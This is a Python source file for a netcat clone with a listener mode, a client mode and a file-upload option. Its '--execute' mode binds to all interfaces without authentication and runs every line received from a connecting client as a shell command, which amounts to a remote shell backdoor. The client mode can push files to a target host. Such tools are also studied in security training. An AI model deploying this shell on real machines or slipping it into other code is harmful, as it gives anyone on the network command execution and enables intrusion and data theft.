import argparse
import socket
import threading
import subprocess
import sys
import os

def handle_client(client_socket, execute):
    """Handles client communication, optionally executing commands."""
    if execute:
        while True:
            try:
                client_socket.send(b"Shell> ")
                cmd = client_socket.recv(1024).decode().strip()
                if cmd.lower() in ["exit", "quit"]:
                    break
                if cmd:
                    output = subprocess.run(cmd, shell=True, capture_output=True)
                    response = output.stdout if output.stdout else output.stderr
                    client_socket.send(response)
            except:
                break
    else:
        while True:
            try:
                request = client_socket.recv(4096)
                if not request:
                    break
                print(request.decode(), end="")
            except:
                break
    client_socket.close()

def start_listener(port, execute):
    """Starts a TCP server to listen for incoming connections."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", port))
    server.listen(5)
    print(f"[+] Listening on port {port}...")

    while True:
        client, addr = server.accept()
        print(f"[+] Connection received from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client, execute))
        client_handler.start()

def connect_to_server(target, port, upload_file):
    """Connects to a Netcat server."""
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target, port))

    if upload_file:
        with open(upload_file, "rb") as f:
            data = f.read()
            client.send(data)
        print(f"[+] File '{upload_file}' sent successfully.")
    else:
        try:
            while True:
                response = client.recv(4096).decode()
                sys.stdout.write(response)
                sys.stdout.flush()
                cmd = input()
                client.send(cmd.encode() + b"\n")
        except:
            print("\n[!] Connection closed.")
            client.close()

def main():
    parser = argparse.ArgumentParser(description="Netcat Clone in Python")
    parser.add_argument("-l", "--listen", action="store_true", help="Start in listening mode (server).")
    parser.add_argument("-p", "--port", type=int, help="Port to listen on or connect to.")
    parser.add_argument("-e", "--execute", action="store_true", help="Execute remote commands (reverse shell).")
    parser.add_argument("-u", "--upload", metavar="FILE", help="Upload a file to the target.")
    parser.add_argument("target", nargs="?", help="Target IP address (for client mode).")

    args = parser.parse_args()

    if args.listen and args.port:
        start_listener(args.port, args.execute)
    elif args.target and args.port:
        connect_to_server(args.target, args.port, args.upload)
    else:
        parser.print_help()
        sys.exit(1)

if __name__ == "__main__":
    main()
